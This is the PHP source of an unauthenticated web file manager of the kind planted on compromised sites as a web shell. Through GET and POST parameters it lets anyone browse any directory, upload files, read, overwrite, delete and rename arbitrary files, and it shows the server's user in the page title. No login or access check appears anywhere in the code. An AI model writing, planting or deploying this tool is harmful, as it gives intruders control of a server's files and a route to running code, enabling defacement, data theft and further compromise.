<title><?= get_current_user() ?></title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<style type="text/css">
@import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@500&display=swap');
.icon {
  max-width:25px;
  max-height:25px;
  margin-bottom:-5px;
  margin-right:7px;
}
  ::-webkit-scrollbar {
    display: none;
}
:root {
  --tampilan:none;
}
div.hide {
  display:var(--tampilan);
}
@media (max-width: 576px) {
  div.container {
    font-size:13px;
  }
  div.col {
    width:10px;
    font-size:12px;
    margin-right:10px;
  }
  div.col-1 {
    display: var(--tampilan);
  }
  div.row {
    font-size:12px;
  }
  div.tampil {
    display: var(--tampilan);
  }
  div.hide {
    display: all;
  }
}

/* Medium devices (tablets, 768px and up) */
@media (min-width: 768px) { ... }

/* Large devices (desktops, 992px and up) */
@media (min-width: 992px) { ... }

/* Extra large devices (large desktops, 1200px and up) */
@media (min-width: 1200px) { ... }
</style>
<?php
date_default_timezone_set('Asia/Jakarta');
function cwd() {
  if (isset($_GET['dir'])) {
    $cwd = $_GET['dir'];
    chdir($cwd);
  } else {
    $cwd = str_replace('\\', '/', getcwd());
  } return $cwd;
}
function perms($file) {
$perms = fileperms($file);

switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;
}
function permission($filename, $perms, $po=false) {
  if (is_writable($filename)) {
    ?> <font color="green"><?php print $perms ?></font> <?php
  } else {
    ?> <font color="red"><?php print $perms ?></font> <?php
  }
}
function alert($msg, $type) {
  ?>
  <div><?=$type?>"><?= $msg ?></div>
  <?php
}
function size($file) {
    $bytes = filesize($file);

    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}
function delete($filename) {
  if (@is_dir($filename)) {
    $scandir = @scandir($filename);
    foreach ($scandir as $object) {
      if ($object != '.' && $object != '..') {
        if (@is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
          @delete($filename.DIRECTORY_SEPARATOR.$object);
        } else {
          @unlink($filename.DIRECTORY_SEPARATOR.$object);
        }
      }
    } if (@rmdir($filename)) {
      return true;
    } else {
      return false;
    }
  } else {
    if (@unlink($filename)) {
      return true;
    } else {
      return false;
    }
  }
}
?>
  <div class="card-body">
    <?php
    switch (@$_POST['tools']) {
      case 'home':
        ?>
        <script type="text/javascript">window.location='http://<?=$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']?>'</script>
        <?php
        break;
      case 'upload':
        ?>
        <form method="post" enctype="multipart/form-data">
          <div class="card border-light mb-3" style="max-width: 100%;">
            <div class="card-header"><h5>EDIT</h5></div>
            <div class="card-body">
              <input type="file" name="file[]" multiple>
              <input class="btn btn-secondary btn-sm" type="submit" name="submit" value="UPLOAD">
              <input type="hidden" name="tools" value="upload">
            </div>
          </div>
      </form>
      <?php
      if (isset($_POST['submit'])) {
        $file = count($_FILES['file']['tmp_name']);
        for ($i=0; $i < $file ; $i++) { 
          if (copy($_FILES['file']['tmp_name'][$i] , cwd().'/'.$_FILES['file']['name'][$i])) {
            alert($_FILES['file']['name'][$i]." uploaded", "success");
          } else {
            alert("permission danied","failed");
          }
        }
      }
      exit();
      break;
    }
    switch (@$_POST['action']) {
      case 'edit':
      if (isset($_POST['submit'])) {
        $handle = fopen($_POST['file'], "w");
        if (fwrite($handle, $_POST['text'])) {
          alert("".basename($_POST['file'])." updated", 'success');
        } else {
          alert("permission danied", 'failed');
        }
      }
      ?>
      <div class="card border-light mb-3" style="max-width: 100%;">
        <div class="card-header"><h5>EDIT</h5></div>
        <div class="card-body">
          <p>Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?></p>
          <p>Size : <?= size($_POST['file']) ?></p>
          <p>Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?></p>
          <form method="post">
            <select class="form-control form-control-sm" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
              <option value="back">back</option>
              <option value="edit" selected>Edit</option>
              <option value="delete">delete</option>
              <option value="rename">rename</option>
            </select>
          </form>
          <form method="post">
            <textarea style="height:250px;" class="form-control" name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea><br>
            <input class="btn btn-secondary btn-sm" style="width:100%;" type="submit" name="submit" value="EDIT">
            <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
            <input type="hidden" name="action" value="edit">
          </form>
        </div>
      </div>
      <?php
      exit();
      break;
      case 'delete':
      delete($_POST['file']);
      break;
      case 'rename':
      if (isset($_POST['submit'])) {
        if (rename($_POST['file'], $_POST['newname'])) {
          ?> <script>window.location='?dir=<?=cwd()?>'</script> <?php
        } else {
          alert("permission danied", 'failed');
        }
      }
      switch ($_POST['file']) {
        case @filetype($_POST['file']) == 'dir':
        if (is_dir($_POST['file'])) {
          ?>
          <div class="card border-light mb-3" style="max-width: 100%;">
            <div class="card-header"><h5>RENAME</h5></div>
            <div class="card-body">
              <p>Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?></p>
              <p>Size : <?= size($_POST['file']) ?></p>
              <p>Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?></p>
              <form method="post">
                <select class="form-control form-control-sm" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
                  <option value="back">back</option>
                  <option value="delete">delete</option>
                  <option value="rename" selected>rename</option>
                </select>
                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                </form>
                <form method="post">
                  <input class="form-control form-control-sm" type="text" name="newname" value="<?= basename($_POST['file']) ?>"><br>
                  <input class="btn btn-secondary btn-sm" style="width:100%;" type="submit" name="submit" value="RENAME">
                  <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                  <input type="hidden" name="action" value="rename">
                </form>
              </div>
            </div>
            <?php
          }
          break;      
          case @filetype($_POST['file']) == 'file':
          if (is_file($_POST['file'])) {
          ?>
          <div class="card border-light mb-3" style="max-width: 100%;">
            <div class="card-header"><h5>RENAME</h5></div>
            <div class="card-body">
              <p>Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?></p>
              <p>Size : <?= size($_POST['file']) ?></p>
              <p>Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?></p>
              <form method="post">
                <select class="form-control form-control-sm" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
                  <option value="back">back</option>
                  <option value="edit">edit</option>
                  <option value="delete">delete</option>
                  <option value="rename" selected>rename</option>
                </select>
                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
              </form>
              <form method="post">
                <input class="form-control form-control-sm" type="text" name="newname" value="<?= basename($_POST['file']) ?>"><br>
                <input class="btn btn-secondary btn-sm" style="width:100%;" type="submit" name="submit" value="RENAME">
                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                <input type="hidden" name="action" value="rename">
              </form>
            </div>
          </div>
        </td>
      </tr>
      <?php
    }
    break;
  }
  exit();
  break;
  case 'back':
  @header("Location: ?dir=".cwd()."");
  break;
}
    ?>
      <div class="card border-light mb-3" style="max-width: 100%;">
        <form method="post">
          <div class="card-header">
            <button class="btn btn-secondary btn-sm" name="tools" value="home">HOME</button>&nbsp&nbsp&nbsp&nbsp
            <button class="btn btn-secondary btn-sm" name="tools" value="upload">UPLOAD</button>
          </div>
        </form>
        <div class="card-body">
      <?php
      if(function_exists('opendir')) {
        if($opendir = opendir(cwd())) {
          while(($readdir = readdir($opendir)) !== false) {
            $getpath[] = $readdir;
          } closedir($opendir);
        } sort($getpath);
      } else {
        $getpath = scandir(cwd());
      }
      foreach ($getpath as $dir) {
        if (!is_dir($dir) || $dir === '.') continue;
        ?>
        <div class="row">
          <div class="col-1">
            <img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='<?=$dir?>'>
          </div>
          <div class="col">
            <a href='?dir=<?= cwd().'/'.$dir ?>'><?=$dir?></a>
          </div>
          <div class="tampil">
            <div class="col">
              --
            </div>
          </div>
          <div class="tampil">
            <div class="col">
              <?= permission($dir, perms($dir)) ?>
            </div>
          </div>
          <form method="post">
            <div class="col">
              <select class="form-control form-control-sm" name="action" onchange="if(this.value != 0) { this.form.submit(); }">
                  <option selected>choose . .</option>
                  <option value="delete">delete</option>
                  <option value="rename">rename</option>
                </select>
                <input type="hidden" name="file" value="<?= cwd().'/'.$dir ?>">
            </div>
          </form>
        </div>
        <?php
      }
      foreach ($getpath as $file) {
        if (is_file($file)) {
          ?>
          <div class="row">
            <div class="col-1">
              <?php
              print("<img class='icon' src='");
              $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
              switch ($ext) {
                case 'php':
                  print("https://image.flaticon.com/icons/png/128/337/337947.png");
                  break;
                case 'pl':
                  print("https://image.flaticon.com/icons/svg/186/186645.svg");
                  break;
                case 'xml':
                  print("https://image.flaticon.com/icons/svg/136/136526.svg");
                  break;
                case 'json':
                  print("https://image.flaticon.com/icons/svg/136/136525.svg");
                  break;
                case 'exe':
                  print("https://image.flaticon.com/icons/svg/136/136531.svg");
                  break;
                case 'png':
                  print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename ($file))."");
                  break;
                case 'html':
                  print("https://image.flaticon.com/icons/png/128/136/136528.png");
                  break;
                case 'css':
                  print("https://image.flaticon.com/icons/png/128/136/136527.png");
                  break;
                case 'ico':
                  print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
                  break;
                case 'jpg':
                  print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename ($file))."");
                  break;
                case 'jpeg':
                  print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename ($file))."");
                  break;
                case 'gif':
                  print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename ($file))."");
                  break;
                case 'pdf':
                  print("https://image.flaticon.com/icons/png/128/136/136522.png");
                  break;
                case 'mp4':
                  print("https://image.flaticon.com/icons/png/128/136/136545.png");
                  break;
                case 'py':
                  print("https://image.flaticon.com/icons/png/128/180/180867.png");
                  break;
                case 'c':
                  print("https://image.flaticon.com/icons/svg/2306/2306037.svg");
                  break;
                case 'bmp':
                  print("https://image.flaticon.com/icons/svg/337/337925.svg");
                  break;
                case 'cpp':
                  print("https://image.flaticon.com/icons/svg/2306/2306030.svg");
                  break;
                case 'txt':
                  print("https://image.flaticon.com/icons/png/128/136/136538.png");
                  break;
                case 'zip':
                  print("https://image.flaticon.com/icons/png/128/136/136544.png");
                  break;
                case 'js':
                  print("https://image.flaticon.com/icons/png/128/1126/1126856.png");
                  break;
                case 'dll':
                  print("https://image.flaticon.com/icons/svg/2306/2306057.svg");
                  break;
                default:
                  print("https://image.flaticon.com/icons/svg/833/833524.svg");
                break;
              } print("' title='{$file}'>");
              $href = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file));
              ?>
              </div>
              <div class="col">
                <a href="<?= $href ?>" target='_blank'><?= $file ?></a>
              </div>
              <div class="tampil">
                <div class="col">
                  <span><?= size($file) ?></span>
                </div>
              </div>
              <div class="tampil">
                <div class="col">
                  <?= permission($file, perms($file)) ?>
                </div>
              </div>
              <form method="post">
                <div class="col">
                  <select class="form-control form-control-sm" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
                    <option selected>choose . .</option>
                    <option value="edit">Edit</option>
                    <option value="delete">delete</option>
                    <option value="rename">rename</option>
                  </select>
                  <input type="hidden" name="file" value="<?= cwd().'/'.$file ?>">
                </div>
              </form>
            </div>
          <?php
        }
      }
